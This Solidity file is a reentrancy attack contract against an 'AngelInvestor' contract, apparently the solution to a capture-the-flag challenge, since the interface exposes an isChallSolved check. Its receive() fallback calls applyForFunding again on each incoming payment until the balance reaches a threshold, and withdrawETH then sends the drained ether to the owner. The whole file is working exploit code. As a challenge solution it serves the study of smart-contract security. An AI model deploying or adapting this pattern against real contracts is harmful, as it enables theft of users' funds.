// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAngelInvestor {
    function CHALLENGE_THRESHOLD() external pure returns (uint256);
    function applyForFunding(uint256 equityOffered) external;
    function buyCompany(address startupOwner) external;
    function isChallSolved() external returns (bool);
}

contract Reentrancy {
    address public owner;
    IAngelInvestor public immutable target;

    modifier onlyOwner() {
        require(msg.sender == owner, "owner role required");
        _;
    }

    constructor(address _angelInvestor) {
        owner = msg.sender;
        target = IAngelInvestor(_angelInvestor);
    }

    function attack() external onlyOwner {
        target.applyForFunding(7);
        target.isChallSolved();
    }

    receive() external payable {
        if (address(this).balance < target.CHALLENGE_THRESHOLD()) {
            target.applyForFunding(7);
        }
    }

    function withdrawETH() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}
